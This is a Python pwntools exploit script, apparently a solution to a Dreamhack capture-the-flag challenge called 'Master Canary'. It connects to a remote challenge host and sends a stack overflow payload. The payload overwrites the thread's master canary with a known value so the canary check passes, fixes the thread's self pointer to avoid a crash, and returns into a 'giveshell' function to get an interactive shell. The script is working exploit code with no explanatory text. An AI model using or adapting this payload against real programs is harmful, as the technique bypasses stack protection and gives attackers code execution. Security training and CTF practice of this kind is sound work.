from pwn import *

port = 19393
rem = remote("host3.dreamhack.games", port)
elf = ELF("./Pwnable/Master Canary/problem/mc_thread")

self_offset = 0x910
newSelf_base = 0x404800
mc_offset = 0x928

payload = b'A' * 0x108
payload += b'A' * 8 # canary
payload += b'B' * 8
payload += p64(elf.symbols['giveshell'])
payload += b'A' * (self_offset - len(payload))
payload += p64(newSelf_base - 0x972) # avoid SIGSEGV when self->canceltype = PTHREAD_CANCEL_DEFERRED
payload += b'C' * (mc_offset - len(payload))
payload += p64(0x4141414141414141) # master canary

rem.sendlineafter(b"Size: ", str(len(payload) // 8).encode())
rem.sendlineafter(b'Data: ', payload)

rem.interactive()
